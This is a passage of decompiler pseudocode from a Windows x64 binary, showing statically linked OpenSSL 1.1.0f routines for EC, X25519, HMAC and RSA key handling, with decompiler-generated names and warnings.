__int64 __fastcall sub_140038640(_QWORD *a1, void *a2, size_t *a3)
{
  __int64 v3; // rax
  __int64 v5; // rbx
  __int64 v7; // rcx
  __int64 *v8; // rbx
  __int64 v9; // rax
  size_t v10; // rcx
  __int64 result; // rax
  __int64 v12; // rax
  int v13; // eax

  v3 = a1[2];
  v5 = a1[5];
  if ( v3 && (v7 = a1[3]) != 0 )
  {
    v8 = *(__int64 **)(v5 + 16);
    if ( !v8 )
      v8 = *(__int64 **)(v3 + 32);
    if ( !a2 )
    {
      v9 = sub_14001C740((__int64)v8);
      v10 = (int)(sub_140021B10(v9) + 7) / 8;
      result = 1i64;
      *a3 = v10;
      return result;
    }
    v12 = std::ios_base::precision(*(std::ios_base **)(v7 + 32));
    v13 = sub_1400290B0(a2, *a3, v12, v8, 0i64);
    if ( v13 > 0 )
    {
      *a3 = v13;
      return 1i64;
    }
  }
  else
  {
    sub_140024610(16, 217, 140, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 155);
  }
  return 0i64;
}

//----- (0000000140038740) ----------------------------------------------------
__int64 __fastcall sub_140038740(__int64 a1, __int64 a2)
{
  int v2; // eax
  const void *v4; // rcx
  void *v6; // rbx
  char **v7; // rax

  v4 = *(const void **)(a2 + 32);
  if ( !v4 )
  {
    sub_140024610(v2 - 32, 268, v2 + 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 98);
    return 0i64;
  }
  v6 = sub_14003BAB0(v4, 0x20ui64);
  if ( !v6 )
  {
    sub_140024610(16, 268, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 104);
    return 0i64;
  }
  v7 = sub_14002C0F0(0x40Au);
  if ( !(unsigned int)sub_140067870(a1, (__int64)v7, -1, 0i64, (__int64)v6, 32) )
  {
    sub_14001D930(v6);
    sub_140024610(16, 268, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 111);
    return 0i64;
  }
  return 1i64;
}
// 14003876F: variable 'v2' is possibly undefined

//----- (0000000140038830) ----------------------------------------------------
__int64 __fastcall sub_140038830(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  _QWORD *v4; // [rsp+30h] [rbp-18h] BYREF
  int v5; // [rsp+60h] [rbp+18h] BYREF
  _OWORD *v6; // [rsp+68h] [rbp+20h] BYREF

  result = sub_140067820(0i64, &v6, &v5, &v4, a2);
  if ( (_DWORD)result )
    return sub_140038E50(a1, v4, v6, v5, 0);
  return result;
}

//----- (0000000140038890) ----------------------------------------------------
__int64 __fastcall sub_140038890(__int64 a1, __int64 a2)
{
  int v2; // eax
  char *v3; // rcx
  __int64 v4; // rdx

  v3 = *(char **)(a1 + 32);
  v4 = *(_QWORD *)(a2 + 32);
  if ( v3 && v4 )
    return (unsigned int)sub_140023460(v3, v4, (unsigned int)(v2 - 8)) == 0;
  else
    return 4294967294i64;
}
// 1400388AF: variable 'v2' is possibly undefined

//----- (00000001400388D0) ----------------------------------------------------
__int64 __fastcall sub_1400388D0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __FrameHandler3::TryBlockMap *v4; // rax
  unsigned int *v5; // rdi
  char *v6; // r8
  int v7; // eax
  unsigned int v8; // ebx
  _QWORD *v9; // [rsp+30h] [rbp-18h] BYREF
  unsigned int v10; // [rsp+60h] [rbp+18h] BYREF
  struct _xDISPATCHER_CONTEXT *v11; // [rsp+68h] [rbp+20h] BYREF

  result = sub_1400675F0(0i64, &v11, &v10, &v9, a2);
  if ( (_DWORD)result )
  {
    v4 = (__FrameHandler3::TryBlockMap *)sub_140050010(0i64, (char **)&v11, v10);
    v5 = (unsigned int *)v4;
    if ( v4 )
    {
      v11 = __FrameHandler3::TryBlockMap::getpDC(v4);
      v7 = sub_14001D4F0(v5);
      v6 = (char *)v11;
    }
    else
    {
      v6 = 0i64;
      v11 = 0i64;
      v7 = 0;
    }
    v10 = v7;
    v8 = sub_140038E50(a1, v9, v6, v7, 1);
    sub_14004FD70((__int64)v5);
    return v8;
  }
  return result;
}

//----- (0000000140038980) ----------------------------------------------------
__int64 __fastcall sub_140038980(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v4; // rax
  int v5; // eax
  __int64 v6; // rbx
  char **v7; // rax
  unsigned int v9; // [rsp+40h] [rbp-28h] BYREF
  __int64 v10; // [rsp+48h] [rbp-20h]
  int v11; // [rsp+50h] [rbp-18h]
  unsigned __int8 *v12; // [rsp+78h] [rbp+10h] BYREF

  v2 = *(_QWORD *)(a2 + 32);
  v12 = 0i64;
  if ( v2 && (v4 = *(_QWORD *)(v2 + 32)) != 0 )
  {
    v10 = v4;
    v9 = 32;
    v11 = 0;
    v5 = sub_140050070(&v9, &v12);
    v6 = v5;
    if ( v5 < 0 )
    {
      sub_140024610(16, 267, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 181);
      return 0i64;
    }
    v7 = sub_14002C0F0(0x40Au);
    if ( !(unsigned int)sub_140067670(a1, (__int64)v7, 0, -1, 0i64, (__int64)v12, v6) )
    {
      sub_14001DA40(v12, v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 0xBBu);
      sub_140024610(16, 267, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 188);
      return 0i64;
    }
    return 1i64;
  }
  else
  {
    sub_140024610(16, 267, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 171);
    return 0i64;
  }
}

//----- (0000000140038AC0) ----------------------------------------------------
__int64 sub_140038AC0()
{
  return 253i64;
}

//----- (0000000140038AD0) ----------------------------------------------------
__int64 sub_140038AD0()
{
  return 128i64;
}

//----- (0000000140038AE0) ----------------------------------------------------
void __fastcall sub_140038AE0(__int64 a1)
{
  void **v1; // rbx

  v1 = *(void ***)(a1 + 32);
  if ( v1 )
    sub_140041990(v1[4]);
  sub_14001D930(v1);
}

//----- (0000000140038B30) ----------------------------------------------------
_BOOL8 __fastcall sub_140038B30(__int64 a1, __int64 a2, unsigned int a3, __int64 a4)
{
  return sub_140039030(a1, a2, a3, a4, 1);
}

//----- (0000000140038B50) ----------------------------------------------------
_BOOL8 __fastcall sub_140038B50(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rsi

  v3 = *(_QWORD *)(a2 + 32);
  if ( !v3 )
    return (int)sub_14002A590(a1, "%*s<INVALID PUBLIC KEY>\n", a3, byte_1400D7DAE) > 0;
  if ( (int)sub_14002A590(a1, "%*sX25519 Public-Key:\n", a3, byte_1400D7DAE) <= 0
    || (int)sub_14002A590(a1, "%*spub:\n", a3, byte_1400D7DAE) <= 0 )
  {
    return 0i64;
  }
  return (unsigned int)sub_1400672A0(a1, v3, 0x20ui64, a3 + 4) != 0;
}

//----- (0000000140038C20) ----------------------------------------------------
__int64 __fastcall sub_140038C20(__int64 a1, int a2, int a3, __int64 a4)
{
  int v6; // edx
  int v7; // edx
  __int64 result; // rax
  const void *v9; // rcx
  void *v10; // rax
  _OWORD *v11; // rax

  v6 = a2 - 3;
  if ( v6 )
  {
    v7 = v6 - 6;
    if ( v7 )
    {
      if ( v7 != 1 )
        return 4294967294i64;
      v9 = *(const void **)(a1 + 32);
      if ( v9 )
      {
        v10 = sub_14003BAB0(v9, 0x20ui64);
        *(_QWORD *)a4 = v10;
        if ( v10 )
          return 32i64;
      }
    }
    else if ( a4 && a3 == 32 )
    {
      v11 = sub_14001DC20(0x28ui64);
      if ( v11 )
      {
        *v11 = *(_OWORD *)a4;
        v11[1] = *(_OWORD *)(a4 + 16);
        sub_14001D1A0(a1, 1034, (__int64)v11);
        return 1i64;
      }
      sub_140024610(16, 266, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 60);
    }
    else
    {
      sub_140024610(16, 266, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 53);
    }
    return 0i64;
  }
  else
  {
    result = 2i64;
    *(_DWORD *)a4 = 672;
  }
  return result;
}

//----- (0000000140038D50) ----------------------------------------------------
__int64 __fastcall sub_140038D50(__int64 a1, __int64 a2)
{
  return sub_140038E50(a2, 0i64, 0i64, 0, 2);
}

//----- (0000000140038D80) ----------------------------------------------------
__int64 __fastcall sub_140038D80(__int64 a1, _BYTE *a2, _QWORD *a3)
{
  __int64 v5; // rdx
  __int64 v6; // rax
  __int64 v7; // rdx
  unsigned __int8 *v8; // r8

  v5 = *(_QWORD *)(a1 + 16);
  if ( v5 && (v6 = *(_QWORD *)(a1 + 24)) != 0 )
  {
    v7 = *(_QWORD *)(v5 + 32);
    v8 = *(unsigned __int8 **)(v6 + 32);
    if ( v7 && *(_QWORD *)(v7 + 32) )
    {
      if ( v8 )
      {
        *a3 = 32i64;
        if ( !a2 || sub_140067A00(a2, *(__m128i **)(v7 + 32), v8) )
          return 1i64;
      }
      else
      {
        sub_140024610(16, 269, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 348);
      }
    }
    else
    {
      sub_140024610(16, 269, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 344);
    }
  }
  else
  {
    sub_140024610(16, 269, 140, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 338);
  }
  return 0i64;
}

//----- (0000000140038E30) ----------------------------------------------------
__int64 __fastcall sub_140038E30(__int64 a1, int a2)
{
  __int64 result; // rax

  result = 4294967294i64;
  if ( a2 == 2 )
    return 1i64;
  return result;
}

//----- (0000000140038E50) ----------------------------------------------------
__int64 __fastcall sub_140038E50(__int64 a1, _QWORD *a2, _OWORD *a3, int a4, int a5)
{
  size_t v6; // rbp
  void **v9; // rax
  void **v10; // rbx
  _OWORD *v11; // rax
  int v12[6]; // [rsp+30h] [rbp-18h] BYREF

  v6 = a4;
  if ( a5 != 2 )
  {
    if ( a2 )
    {
      sub_1400673E0(0i64, v12, 0i64, a2);
      if ( v12[0] != -1 )
      {
        sub_140024610(16, 266, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 47);
        return 0i64;
      }
    }
    if ( !a3 || (_DWORD)v6 != 32 )
    {
      sub_140024610(16, 266, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 53);
      return 0i64;
    }
  }
  v9 = (void **)sub_14001DC20(0x28ui64);
  v10 = v9;
  if ( !v9 )
  {
    sub_140024610(16, 266, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 60);
    return 0i64;
  }
  if ( a5 )
  {
    v11 = sub_1400419B0(0x20ui64);
    v10[4] = v11;
    if ( !v11 )
    {
      sub_140024610(16, 266, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecx_meth.c", 69);
LABEL_18:
      sub_14001D930(v10);
      return 0i64;
    }
    if ( a5 == 2 )
    {
      if ( (int)sub_140025460((__int64)v11, 0x20u) <= 0 )
      {
        sub_140041990(v10[4]);
        goto LABEL_18;
      }
      *(_BYTE *)v10[4] &= 0xF8u;
      *((_BYTE *)v10[4] + 31) &= ~0x80u;
      *((_BYTE *)v10[4] + 31) |= 0x40u;
    }
    else
    {
      *v11 = *a3;
      v11[1] = a3[1];
    }
    sub_140067A40(v10, (__m128i *)v10[4]);
    goto LABEL_22;
  }
  memmove(v9, a3, v6);
LABEL_22:
  sub_14001D1A0(a1, 1034, (__int64)v10);
  return 1i64;
}
// 140038E50: using guessed type int var_18[6];

//----- (0000000140039030) ----------------------------------------------------
_BOOL8 __fastcall sub_140039030(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, int a5)
{
  __int64 v6; // rbx

  v6 = *(_QWORD *)(a2 + 32);
  if ( a5 == 1 )
  {
    if ( !v6 || !*(_QWORD *)(v6 + 32) )
      return (int)sub_14002A590(a1, "%*s<INVALID PRIVATE KEY>\n", a3, byte_1400D7DAE) > 0;
    if ( (int)sub_14002A590(a1, "%*sX25519 Private-Key:\n", a3, byte_1400D7DAE) <= 0
      || (int)sub_14002A590(a1, "%*spriv:\n", a3, byte_1400D7DAE) <= 0
      || !(unsigned int)sub_1400672A0(a1, *(_QWORD *)(v6 + 32), 0x20ui64, a3 + 4) )
    {
      return 0i64;
    }
  }
  else
  {
    if ( !v6 )
      return (int)sub_14002A590(a1, "%*s<INVALID PUBLIC KEY>\n", a3, byte_1400D7DAE) > 0;
    if ( (int)sub_14002A590(a1, "%*sX25519 Public-Key:\n", a3, byte_1400D7DAE) <= 0 )
      return 0i64;
  }
  if ( (int)sub_14002A590(a1, "%*spub:\n", a3, byte_1400D7DAE) <= 0 )
    return 0i64;
  return (unsigned int)sub_1400672A0(a1, v6, 0x20ui64, a3 + 4) != 0;
}

//----- (0000000140039190) ----------------------------------------------------
__int64 __fastcall sub_140039190(__int64 a1, __int64 a2, char *a3)
{
  __int64 v6; // rcx
  __int64 v7; // rdx
  char v8; // al
  char v9; // al

  if ( !a3 )
    return 0i64;
  v6 = 0i64;
  v7 = 0i64;
  while ( 1 )
  {
    v8 = *(_BYTE *)(a2 + v7++);
    if ( v8 != aKey[v7 - 1] )
      break;
    if ( v7 == 4 )
      return sub_1400207C0(a1, 6i64, a3);
  }
  while ( 1 )
  {
    v9 = *(_BYTE *)(a2 + v6++);
    if ( v9 != aHexkey[v6 - 1] )
      break;
    if ( v6 == 7 )
      return (__int64)sub_1400206E0(a1, 6u, a3);
  }
  return 4294967294i64;
}

//----- (0000000140039220) ----------------------------------------------------
__int64 __fastcall sub_140039220(__int64 a1)
{
  int v1; // eax
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  _QWORD *v5; // rax
  __int64 result; // rax

  v3 = sub_14001DC20((unsigned int)(v1 + 8));
  v4 = v3;
  if ( !v3 )
    return 0i64;
  *((_DWORD *)v3 + 3) = 4;
  v5 = sub_14006B370();
  v4[4] = v5;
  if ( !v5 )
  {
    sub_14001D930(v4);
    return 0i64;
  }
  *(_QWORD *)(a1 + 40) = v4;
  result = 1i64;
  *(_DWORD *)(a1 + 72) = 0;
  return result;
}
// 14003923A: variable 'v1' is possibly undefined

//----- (00000001400392B0) ----------------------------------------------------
void __fastcall sub_1400392B0(std::ios_base *a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx

  v2 = std::ios_base::width(a1);
  v3 = v2;
  if ( v2 )
  {
    sub_14006B2F0(*(_QWORD **)(v2 + 32));
    sub_14001DA40(
      *(void **)(v3 + 16),
      *(int *)(v3 + 8),
      (__int64)"..\\..\\openssl-1.1.0f\\crypto\\hmac\\hm_pmeth.c",
      0x4Eu);
    sub_14001D930((void *)v3);
    std::swfun(a1, 0i64);
  }
}

//----- (0000000140039320) ----------------------------------------------------
__int64 __fastcall sub_140039320(std::ios_base *a1, std::ios_base *a2)
{
  __int64 result; // rax
  __int64 v5; // rdi
  _QWORD *v6; // rsi
  _BYTE *v7; // rdx

  result = sub_140039220((__int64)a1);
  if ( (_DWORD)result )
  {
    v5 = std::ios_base::width(a2);
    v6 = (_QWORD *)std::ios_base::width(a1);
    *v6 = *(_QWORD *)v5;
    if ( (unsigned int)sub_14006B1E0(v6[4], *(_QWORD *)(v5 + 32))
      && ((v7 = *(_BYTE **)(v5 + 16)) == 0i64 || (unsigned int)sub_14006B0A0((__int64)(v6 + 1), v7, *(_DWORD *)(v5 + 8))) )
    {
      return 1i64;
    }
    else
    {
      sub_1400392B0(a1);
      return 0i64;
    }
  }
  return result;
}

//----- (00000001400393D0) ----------------------------------------------------
__int64 __fastcall sub_1400393D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 v5; // rax

  v2 = *(_QWORD *)(a1 + 40);
  if ( !*(_QWORD *)(v2 + 16) )
    return 0i64;
  v5 = sub_14006B080(v2 + 8);
  if ( !v5 )
    return 0i64;
  sub_14001D1A0(a2, 855, v5);
  return 1i64;
}

//----- (0000000140039420) ----------------------------------------------------
__int64 __fastcall sub_140039420(__int64 a1, struct std::ios_base *a2)
{
  __int64 v2; // rbx
  int v4; // eax

  v2 = *(_QWORD *)(a1 + 40);
  v4 = sub_1400252C0((__int64)a2, 0xFFFFFEFF);
  sub_14006B4B0(*(__int64 **)(v2 + 32), v4);
  sub_1400252B0((__int64)a2, 256);
  std::swfun(a2, (__int64)sub_1400395A0);
  return 1i64;
}

//----- (0000000140039480) ----------------------------------------------------
__int64 __fastcall sub_140039480(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4)
{
  __int64 v4; // rsi
  __int64 v7; // rax
  int v8; // eax
  unsigned int v10; // [rsp+30h] [rbp+8h] BYREF

  v4 = *(_QWORD *)(a1 + 40);
  v7 = sub_1400252A0(a4);
  v8 = sub_1400253D0(v7);
  if ( v8 < 0 )
    return 0i64;
  *a3 = v8;
  if ( a2 )
  {
    if ( !sub_14006B500(*(_QWORD *)(v4 + 32), a2, &v10) )
      return 0i64;
    *a3 = v10;
  }
  return 1i64;
}

//----- (0000000140039510) ----------------------------------------------------
__int64 __fastcall sub_140039510(__int64 *a1, int a2, int a3, _BYTE *a4)
{
  __int64 v5; // rcx
  int v6; // edx
  int v7; // edx
  __int64 result; // rax

  v5 = a1[5];
  v6 = a2 - 1;
  if ( !v6 )
  {
    *(_QWORD *)v5 = a4;
    return 1i64;
  }
  v7 = v6 - 5;
  if ( !v7 )
    return (a4 || a3 <= 0) && a3 >= -1 && (unsigned int)sub_14006B0A0(v5 + 8, a4, a3);
  if ( v7 != 1 )
    return 4294967294i64;
  result = sub_14006B5B0(
             *(_QWORD *)(v5 + 32),
             *(const void **)(*(_QWORD *)(a1[2] + 32) + 8i64),
             **(_DWORD **)(a1[2] + 32),
             *(int **)v5,
             a1[1]);
  if ( (_DWORD)result )
    return 1i64;
  return result;
}

//----- (00000001400395A0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400395A0(std::ios_base *a1)
{
  __int64 v1; // rax

  v1 = std::ios_base::precision(a1);
  return (unsigned int)sub_14006B820(*(_QWORD **)(*(_QWORD *)(v1 + 40) + 32i64)) != 0;
}

//----- (00000001400395F0) ----------------------------------------------------
__int64 __fastcall sub_1400395F0(__int64 a1, void *a2, _QWORD *a3, __int64 a4, unsigned int a5)
{
  __int64 v5; // rbx
  int v10; // eax
  void *v11; // rax
  __int64 result; // rax

  v5 = *(_QWORD *)(a1 + 40);
  if ( *(_DWORD *)(v5 + 24) != 4 )
  {
    result = sub_14005E300(a5, a4, (__int64)a2, *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64));
LABEL_8:
    if ( (int)result >= 0 )
    {
      *a3 = (int)result;
      return 1i64;
    }
    return result;
  }
  if ( !*(_QWORD *)(v5 + 56) )
  {
    v10 = sub_14001D700(*(_QWORD *)(a1 + 16));
    v11 = sub_14001D8E0(v10);
    *(_QWORD *)(v5 + 56) = v11;
    if ( !v11 )
      return 0xFFFFFFFFi64;
  }
  result = sub_14005E300(a5, a4, *(_QWORD *)(v5 + 56), *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64));
  if ( (int)result > 0 )
  {
    result = sub_14006CAE0(
               a2,
               result,
               *(const void **)(v5 + 56),
               result,
               result,
               *(_QWORD *)(v5 + 64),
               *(_DWORD *)(v5 + 72),
               *(int **)(v5 + 32),
               *(_QWORD *)(v5 + 40));
    goto LABEL_8;
  }
  return result;
}

//----- (0000000140039710) ----------------------------------------------------
__int64 __fastcall sub_140039710(__int64 a1, int a2, int a3, unsigned int *a4)
{
  __int64 v4; // rbx
  __int64 v6; // rsi
  __int64 result; // rax
  __int16 v9; // r8
  bool v10; // zf
  __int64 v11; // rax
  int v12; // [rsp+20h] [rbp-18h]

  v4 = *(_QWORD *)(a1 + 40);
  v6 = a3;
  if ( a2 > 4097 )
  {
    switch ( a2 )
    {
      case 4098:
      case 4103:
        if ( *(_DWORD *)(v4 + 24) != 6 )
        {
          sub_140024610(4, 143, 146, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 405);
          return 4294967294i64;
        }
        if ( a2 == 4103 )
        {
          *a4 = *(_DWORD *)(v4 + 48);
          return 1i64;
        }
        if ( a3 < -2 )
          return 4294967294i64;
        *(_DWORD *)(v4 + 48) = a3;
        return 1i64;
      case 4099:
        if ( a3 < 512 )
        {
          sub_140024610(4, 143, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 419);
          return 4294967294i64;
        }
        *(_DWORD *)v4 = a3;
        return 1i64;
      case 4100:
        if ( a4 && sub_1400270F0((__int64)a4) && !sub_140027110((__int64)a4) )
        {
          sub_140026FF0(*(_DWORD **)(v4 + 8));
          result = 1i64;
          *(_QWORD *)(v4 + 8) = a4;
          return result;
        }
        sub_140024610(4, 143, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 427);
        return 4294967294i64;
      case 4101:
      case 4104:
        if ( ((*(_DWORD *)(v4 + 24) - 4) & 0xFFFFFFFD) != 0 )
        {
          sub_140024610(4, 143, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 460);
          return 4294967294i64;
        }
        if ( a2 == 4104 )
        {
          v11 = *(_QWORD *)(v4 + 40);
          if ( !v11 )
            v11 = *(_QWORD *)(v4 + 32);
          *(_QWORD *)a4 = v11;
          return 1i64;
        }
        else
        {
          *(_QWORD *)(v4 + 40) = a4;
          return 1i64;
        }
      case 4102:
        *a4 = *(_DWORD *)(v4 + 24);
        return 1i64;
      case 4105:
      case 4107:
        if ( *(_DWORD *)(v4 + 24) != 4 )
        {
          v12 = 437;
          goto LABEL_42;
        }
        if ( a2 == 4107 )
        {
          *(_QWORD *)a4 = *(_QWORD *)(v4 + 32);
          return 1i64;
        }
        else
        {
LABEL_5:
          *(_QWORD *)(v4 + 32) = a4;
          return 1i64;
        }
      case 4106:
        if ( *(_DWORD *)(v4 + 24) != 4 )
        {
          v12 = 474;
          goto LABEL_42;
        }
        sub_14001D930(*(void **)(v4 + 64));
        if ( a4 && (int)v6 > 0 )
        {
          *(_QWORD *)(v4 + 64) = a4;
          result = 1i64;
          *(_QWORD *)(v4 + 72) = v6;
        }
        else
        {
          *(_QWORD *)(v4 + 64) = 0i64;
          *(_QWORD *)(v4 + 72) = 0i64;
          return 1i64;
        }
        return result;
      case 4108:
        if ( *(_DWORD *)(v4 + 24) == 4 )
        {
          *(_QWORD *)a4 = *(_QWORD *)(v4 + 64);
          return *(unsigned int *)(v4 + 72);
        }
        v12 = 489;
LABEL_42:
        v9 = 141;
LABEL_8:
        sub_140024610(4, 143, v9, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", v12);
        break;
      default:
        return 4294967294i64;
    }
    return 4294967294i64;
  }
  if ( a2 == 4097 )
  {
    if ( (unsigned int)(a3 - 1) <= 5 )
    {
      if ( !(unsigned int)sub_14003A980(*(unsigned int **)(v4 + 32), a3) )
        return 0i64;
      if ( (_DWORD)v6 == 6 )
      {
        v10 = (*(_BYTE *)(a1 + 32) & 0x18) == 0;
      }
      else
      {
        if ( (_DWORD)v6 != 4 )
        {
LABEL_21:
          *(_DWORD *)(v4 + 24) = v6;
          return 1i64;
        }
        v10 = (*(_DWORD *)(a1 + 32) & 0x300) == 0;
      }
      if ( !v10 )
      {
        if ( !*(_QWORD *)(v4 + 32) )
          *(_QWORD *)(v4 + 32) = sub_14005BAC0();
        goto LABEL_21;
      }
    }
    sub_140024610(4, 143, 144, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 395);
    return 4294967294i64;
  }
  switch ( a2 )
  {
    case 1:
      if ( (unsigned int)sub_14003A980(a4, *(_DWORD *)(v4 + 24)) )
        goto LABEL_5;
      return 0i64;
    case 2:
      v12 = 508;
      v9 = 148;
      goto LABEL_8;
    case 3:
    case 4:
    case 5:
    case 7:
    case 9:
    case 10:
    case 11:
      return 1i64;
    case 13:
      *(_QWORD *)a4 = *(_QWORD *)(v4 + 32);
      result = 1i64;
      break;
    default:
      return 4294967294i64;
  }
  return result;
}

//----- (0000000140039AE0) ----------------------------------------------------
__int64 __fastcall sub_140039AE0(__int64 *a1, const char *a2, char *a3)
{
  int v3; // eax
  __int64 v8; // rcx
  char v9; // al
  __int64 v10; // rcx
  __int64 v11; // rcx
  char v12; // al
  __int64 v13; // rcx
  char v14; // al
  __int64 v15; // rcx
  char v16; // al
  __int64 v17; // rcx
  char v18; // al
  char v19; // al
  __int64 v20; // r8
  char v21; // al
  unsigned int v22; // eax
  unsigned int v23; // eax
  int v24; // ebx
  __int64 v25; // rax
  __int64 v26; // rax
  void *v27; // rax
  void *v28; // rbx
  int v29; // edi
  _DWORD *v30; // [rsp+50h] [rbp+18h] BYREF

  if ( !a3 )
  {
    sub_140024610(v3 - 44, v3 + 96, v3 + 99, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 521);
    return 0i64;
  }
  if ( !strcmp(a2, "rsa_padding_mode") )
  {
    v8 = 0i64;
    while ( 1 )
    {
      v9 = a3[v8++];
      if ( v9 != aPkcs1[v8 - 1] )
        break;
      if ( v8 == 6 )
      {
        LODWORD(v10) = 1;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    v11 = 0i64;
    while ( 1 )
    {
      v12 = a3[v11++];
      if ( v12 != aSslv23[v11 - 1] )
        break;
      if ( v11 == 7 )
      {
        LODWORD(v10) = 2;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    v13 = 0i64;
    while ( 1 )
    {
      v14 = a3[v13++];
      if ( v14 != aNone[v13 - 1] )
        break;
      if ( v13 == 5 )
      {
        LODWORD(v10) = 3;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    v15 = 0i64;
    while ( 1 )
    {
      v16 = a3[v15++];
      if ( v16 != aOeap[v15 - 1] )
        break;
      if ( v15 == 5 )
      {
        LODWORD(v10) = 4;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    v17 = 0i64;
    while ( 1 )
    {
      v18 = a3[v17++];
      if ( v18 != aOaep[v17 - 1] )
        break;
      if ( v17 == 5 )
      {
        LODWORD(v10) = 4;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    v10 = 0i64;
    while ( 1 )
    {
      v19 = a3[v10++];
      if ( v19 != aX931[v10 - 1] )
        break;
      if ( v10 == 5 )
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
    }
    v20 = 0i64;
    while ( 1 )
    {
      v21 = a3[v20++];
      if ( v21 != aPss[v20 - 1] )
        break;
      if ( v20 == 4 )
      {
        LODWORD(v10) = 6;
        return sub_140020440(a1, 6, -1, 0x1001u, v10, 0i64);
      }
    }
    sub_140024610(4, 144, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 541);
    return 4294967294i64;
  }
  if ( !strcmp(a2, "rsa_pss_saltlen") )
  {
    v22 = sub_14000B3C8((__int64)a3);
    return sub_140020440(a1, 6, 24, 0x1002u, v22, 0i64);
  }
  if ( !strcmp(a2, "rsa_keygen_bits") )
  {
    v23 = sub_14000B3C8((__int64)a3);
    return sub_140020440(a1, 6, 4, 0x1003u, v23, 0i64);
  }
  if ( !strcmp(a2, "rsa_keygen_pubexp") )
  {
    v30 = 0i64;
    if ( !(unsigned int)sub_140022C30((__int64 *)&v30, a3) )
      return 0i64;
    v24 = sub_140020440(a1, 6, 4, 0x1004u, 0, (__int64)v30);
    if ( v24 <= 0 )
      sub_140026FF0(v30);
    return (unsigned int)v24;
  }
  if ( !strcmp(a2, "rsa_mgf1_md") )
  {
    v25 = sub_14001E990((__int64)a3);
    if ( v25 )
      return sub_140020440(a1, 6, 1016, 0x1005u, 0, v25);
    sub_140024610(4, 144, 157, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 573);
    return 0i64;
  }
  if ( !strcmp(a2, "rsa_oaep_md") )
  {
    v26 = sub_14001E990((__int64)a3);
    if ( v26 )
      return sub_140020440(a1, 6, 768, 0x1009u, 0, v26);
    sub_140024610(4, 144, 157, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pmeth.c", 582);
    return 0i64;
  }
  if ( strcmp(a2, "rsa_oaep_label") )
    return 4294967294i64;
  v27 = sub_14003BE60(a3, &v30);
  v28 = v27;
  if ( !v27 )
    return 0i64;
  v29 = sub_140020440(a1, 6, 768, 0x100Au, (unsigned int)v30, (__int64)v27);
  if ( v29 <= 0 )
    sub_14001D930(v28);
  return (unsigned int)v29;
}
// 140039B18: variable 'v3' is possibly undefined

//----- (0000000140039F70) ----------------------------------------------------
__int64 __fastcall sub_140039F70(__int64 a1, __int64 a2)
{
  __int64 v2; // r14
  _DWORD *v5; // rax
  __int64 result; // rax
  __int64 v7; // rbx
  void *v8; // rax
  void *v9; // rdi
  int v10; // esi

  v2 = *(_QWORD *)(a1 + 40);
  if ( !*(_QWORD *)(v2 + 8) )
  {
    v5 = sub_140027200();
    *(_QWORD *)(v2 + 8) = v5;
    if ( !v5 || !(unsigned int)sub_140027560((__int64)v5, 65537i64) )
      return 0i64;
  }
  result = sub_14002D050();
  v7 = result;
  if ( result )
  {
    if ( *(_QWORD *)(a1 + 56) )
    {
      v8 = sub_1400267B0();
      v9 = v8;
      if ( !v8 )
      {
        sub_14002CEF0(v7);
        return 0i64;
      }
      sub_14001EDC0((__int64)v8, a1);
    }
    else
    {
      v9 = 0i64;
